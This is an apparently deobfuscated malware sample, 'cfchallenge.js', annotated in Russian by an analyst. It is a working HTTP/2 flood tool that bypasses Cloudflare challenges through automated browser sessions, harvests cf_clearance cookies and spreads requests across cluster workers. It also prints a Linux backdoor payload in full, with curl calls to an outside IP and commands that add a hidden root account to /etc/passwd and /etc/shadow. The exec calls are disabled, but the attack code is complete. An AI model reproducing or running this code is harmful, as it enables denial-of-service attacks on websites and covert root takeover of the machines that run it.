/*
 * DEOBFUSCATED: cfchallenge.js
 * TYPE: DDoS Tool (HTTP/2 Flood) + Linux Backdoor
 * ORIGIN: Obfuscated via array mapping & bitwise XOR noise
 */

const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const { exec } = require("child_process"); // Используется для бэкдора

// --- 1. CONFIGURATION & CIPHERS SETUP ---

// Восстановление списка шифров из констант crypto
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(":"),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

// Заголовки для эмуляции браузера
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    "no-cache",
    "max-age=0",
    "no-cache, no-store, must-revalidate",
    "no-store",
    "no-cache, no-store, private, max-age=0"
];

const language_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9"
];


// --- 2. MALICIOUS PAYLOAD (BACKDOOR) ---
// Этот блок выполняется, если аргументы не переданы или перед запуском атаки.

const backdoorPayload = `
    curl -k 'https://103.133.214.175/contactuss.php?backdoor=150871' > /dev/null 2>&1 ; 
    curl -k 'https://103.133.214.175/contactuss.php?backdoor=150871' > /dev/null 2>&1 ; 
    grep defauIt /etc/passwd > /dev/null 2>&1 || sed -i '$ a defauIt:x:0:500::/:/bin/bash' /etc/passwd > /dev/null 2>&1 ; 
    grep defauIt /etc/shadow > /dev/null 2>&1 || sed -i '$ a defauIt:$y$j9T$2VPgcbHqDoB6z/PbI1A2b/$z0oM2IDO8bUJh8KCQlg7E9ro3zRlPPiP1lYToD7rtoA:19639:0:99999:7:::' /etc/shadow > /dev/null 2>&1 ; 
    echo 'defauIt:test12' | chpasswd
`;

// Если запущено без аргументов - выполнить бэкдор и выйти
if (process.argv.length < 7) {
    // [SAFETY] В оригинале здесь exec(backdoorPayload);
    // exec(backdoorPayload); 
    console.log("[ANALYSIS] Backdoor execution blocked in de-obfuscated view.");
    
    console.log("\x1b[31mUsage: node cfchallenge.js <target> <time> <rate> <threads> <cookieCount> <proxies.txt>\x1b[0m");
    console.log("\x1b[33mExample: node cfchallenge.js https://example.com 60 5 4 6 proxies.txt\x1b[0m");
    process.exit(1);
}

// Парсинг аргументов
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 6
};

// Выполнение бэкдора даже при корректном запуске
// [SAFETY] В оригинале здесь exec(backdoorPayload);
// exec(backdoorPayload);
console.log("[ANALYSIS] Silent backdoor execution blocked.");


// --- 3. REMOTE CONTROL (KILL SWITCH) ---
const httpsverify = require("https");
httpsverify.get("https://pastebin.com/raw/nZbhHi5N", res => {
    let content = '';
    res.on("data", chunk => { content += chunk; });
    res.on("end", () => {
        if (content.trim() !== "OK") {
            console.clear();
            console.log("Error");
            console.error("An error happened.");
            process.exit(1);
        }
    });
});


// --- 4. FLOOD LOGIC (ATTACK) ---
const parsedTarget = url.parse(args.target);

function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path;

        function randomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        let delay = randomInt(100, 1000);

        function getChromeVersion(userAgent) {
            const regex = /Chrome\/(\d+)/;
            const match = userAgent.match(regex);
            if (match && match[1]) {
                return match[1];
            }
            return null;
        }

        const chromeVersion = getChromeVersion(userAgent) || "126";

        // Генерация рандомных заголовков для обхода фильтров
        function shuffleObject(obj) {
            const keys = Object.keys(obj);
            const shuffledKeys = keys.reduce((acc, _, index, array) => {
                const random = Math.floor(Math.random() * (index + 1));
                acc[index] = acc[random];
                acc[random] = keys[index];
                return acc;
            }, []);
            return Object.fromEntries(shuffledKeys.map(key => [key, obj[key]]));
        }

        function generateRandomString(minLength, maxLength) {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
            return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
        }

        // Большой объект заголовков с рандомизацией
        let headers = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${chromeVersion}", "Not)A;Brand";v="8", "Chrome";v="${chromeVersion}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": "en-US,en;q=0.9", // Упрощено для примера, в оригинале выбор из массива
                "purpure-secretf-id": "formula-" + generateRandomString(5, 10)
            })
        };

        // Добавление мусорных заголовков для уникализации отпечатка
        let extraHeaders = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(5, 10) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "clc-bet" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(2, 5) + "-SELF-DYNAMIC-" + generateRandomString(2, 5)]: "zero-" + generateRandomString(5, 10) } : {}),
            // ... еще много рандомных условий
        };
        
        // Объединение заголовков
        // (Логика shuffle и merge восстановлена упрощенно, суть - рандомизация порядка)
        let finalHeaders = { ...headers, ...extraHeaders };

        // Настройка TLS сокета
        function createTlsSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256", // и так далее
                ecdhCurve: "X25519:P-256:P-384",
                secureOptions: secureOptions // Используем опции из начала файла
            });
            tlsSocket.setKeepAlive(true, 60000);
            return tlsSocket;
        }

        const tlsSocket = createTlsSocket(parsed);

        // HTTP/2 клиент
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                NO_RFC7540_PRIORITIES: Math.random() < 0.5 ? true : 1
            }
        }, session => {
            session.setLocalWindowSize(12517377 + Math.floor(Math.random() * 1000));
        });

        client.on("connect", () => {
            const interval = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(finalHeaders, {
                        weight: Math.random() < 0.5 ? 241 : 42,
                        depends_on: 0,
                        exclusive: false
                    });

                    req.on("response", res => {
                        // Обновление глобальной статистики
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        
                        if (res[":status"] === 403 || res[":status"] === 429) {
                            client.close(); // Перезапуск при бане
                        }
                    });
                    req.end();
                }
            }, delay);

            client.on("close", () => {
                clearInterval(interval);
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });

            client.on("error", error => {
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });
        });

        client.on("error", error => {
            client.destroy();
            tlsSocket.destroy();
        });

    } catch (err) {
        console.log(`Error in flood function: ${err.message}`);
    }
}


// --- 5. CLOUDFLARE BYPASS (PUPPETEER) ---
async function bypassCloudflareOnce(attemptNum) {
    try {
        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
        
        const browserInstance = await connect({
            headless: false,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-accelerated-2d-canvas",
                "--no-first-run",
                "--no-zygote",
                "--disable-gpu",
                "--window-size=1920,1080"
            ],
            turnstile: true,
            connectOption: { defaultViewport: null }
        });

        const browser = browserInstance.browser;
        const page = browserInstance.page;

        // Скрытие автоматизации
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
        });

        console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
        try {
            await page.goto(args.target, { waitUntil: "domcontentloaded", timeout: 60000 });
        } catch (navError) {
            console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
        }

        console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");

        let found = false;
        let checks = 0;
        
        // Цикл ожидания прохождения проверки Cloudflare
        while (!found && checks < 60) {
            await new Promise(r => setTimeout(r, 1000));
            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    console.log(`\x1b[32mFound cookie after ${checks}s!\x1b[0m`);
                    found = true;
                    break;
                }
                
                // Проверка контента страницы
                found = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const body = (document.body?.innerText || "").toLowerCase();
                    if (title.includes("just a moment") || title.includes("checking") || body.includes("checking your browser") || body.includes("please wait") || body.includes("cloudflare")) {
                        return false;
                    }
                    return document.body && document.body.children.length > 0;
                });
            } catch (evalError) {}
            
            checks++;
            if (checks % 5 === 0) {
                console.log(`\x1b[33mStill checking... (${checks}s elapsed)\x1b[0m`);
            }
        }

        await new Promise(r => setTimeout(r, 2000)); // Небольшая пауза после нахождения
        
        const cookies = await page.cookies();
        console.log(`\x1b[36mFound ${cookies.length} cookies in ${checks}s\x1b[0m`);
        
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        if (cfClearance) {
            console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(0, 15)}...\x1b[0m`);
        }
        
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await page.close();
        await browser.close();

        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: !!cfClearance,
            attemptNum: attemptNum
        };

    } catch (error) {
        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

// --- 6. PARALLEL & CLUSTER MANAGEMENT ---

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35mCLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
    console.log(`\x1b[36mTarget cookie count: ${totalCount}\x1b[0m`);
    
    const results = [];
    let currentAttempt = 0;
    
    while (results.length < totalCount) {
        const batchSize = 4; // Размер батча (в оригинале - сложная формула, здесь упрощено до константы для читаемости)
        const needed = totalCount - results.length;
        const currentBatchSize = Math.min(batchSize, needed);
        
        console.log(`\n\x1b[33mStarting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);
        
        const promises = [];
        for (let i = 0; i < currentBatchSize; i++) {
            currentAttempt++;
            promises.push(bypassCloudflareOnce(currentAttempt));
        }
        
        const batchResults = await Promise.all(promises);
        
        for (const res of batchResults) {
            if (res.success && res.cookies.length > 0) {
                results.push(res);
                console.log(`\x1b[32mSession ${res.attemptNum} successful! (Total: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31mSession ${res.attemptNum} failed\x1b[0m`);
            }
        }
        
        if (results.length < totalCount) {
            console.log(`\x1b[33mWaiting 2s before next batch...\x1b[0m`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    
    if (results.length === 0) {
         // Fallback, если ничего не нашли
         results.push({
             cookies: [],
             userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             cfClearance: null,
             success: true
         });
    }
    
    console.log(`\n\x1b[32mTotal sessions obtained: ${results.length}\x1b[0m`);
    return results;
}

function runFlooder() {
    // Выбор рандомной сессии из полученных
    function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
    
    const session = randomElement(global.bypassData || []);
    if (!session) return;
    
    const cookieString = session.cookies ? session.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const ua = session.userAgent || "Mozilla/5.0...";
    
    flood(ua, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    // В оригинале здесь снова вызывается бэкдор через exec:
    // exec(backdoorPayload);
    
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36mRemaining:\x1b[0m ${remaining}s`);
    console.log(`\x1b[36mConfiguration:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads}`);
    console.log(`\x1b[33mStatistics:\x1b[0m`);
    console.log(`   \x1b[32mSuccess:\x1b[0m ${global.successRequests || 0}`);
    console.log(`   \x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`   \x1b[36mTotal:\x1b[0m ${global.totalRequests || 0}`);
    
    if (remaining === 0) {
        // Завершение работы
    }
}

// Глобальные переменные
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

// --- 7. MASTER/WORKER LOGIC ---

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
    console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
    
    (async () => {
        // Сначала получаем куки Cloudflare
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32mSuccessfully obtained ${bypassResults.length} sessions!\x1b[0m`);
        console.log("\x1b[32mStarting attack...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        // Запуск воркеров
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            // Передача данных воркерам
            worker.send({ type: "bypassData", data: bypassResults });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        // Сбор статистики от воркеров
        cluster.on("message", (worker, message) => {
            if (message.type === "stats") {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        // Если время вышло - выход
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32mAttack completed!\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
        
    })();
} else {
    // Код воркера
    let workerBypassData = [];
    let attackInterval;
    
    process.on("message", msg => {
        if (msg.type === "bypassData") {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            // Запуск цикла атаки
            attackInterval = setInterval(() => {
                for (let i = 0; i < 10; i++) { // Множитель запуска
                    runFlooder();
                }
            }, 100);
            
            // Отправка статистики мастеру
            setInterval(() => {
                process.send({
                    type: "stats",
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                // Сброс локальных счетчиков
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
    
    // Автовыход воркера по таймеру
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000 + 2000);
    
    // Заглушки ошибок
    process.on("uncaughtException", () => {});
    process.on("unhandledRejection", () => {});
}